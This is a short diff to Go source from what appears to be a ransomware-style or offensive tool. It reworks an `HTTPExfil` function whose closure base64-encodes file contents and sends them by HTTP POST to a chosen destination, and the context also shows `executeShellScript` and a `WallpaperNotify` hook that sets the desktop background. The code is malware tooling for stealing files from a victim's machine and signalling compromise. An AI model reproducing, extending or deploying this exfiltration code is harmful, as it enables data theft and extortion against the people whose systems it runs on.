@@ -118,8 +118,11 @@ func executeShellScript(
 
 // HTTPExfil will return a function pointer to an ExfilFunc that
 // exfils via HTTP POST requests with the specified headers.
-func HTTPExfil(dst string, headers map[string]string) ExfilFunc {
-	return func(path string, b []byte) error {
+func HTTPExfil(
+	dst string,
+	headers map[string]string,
+) (ExfilFunc, error) {
+	var f ExfilFunc = func(path string, b []byte) error {
 		var b64 string
 		var e error
 		var n int
@@ -160,6 +163,8 @@ func HTTPExfil(dst string, headers map[string]string) ExfilFunc {
 			http.DefaultClient.Do(req)
 		}
 	}
+
+	return f, nil
 }
 
 // WallpaperNotify is a NotifyFunc that sets the background wallpaper.
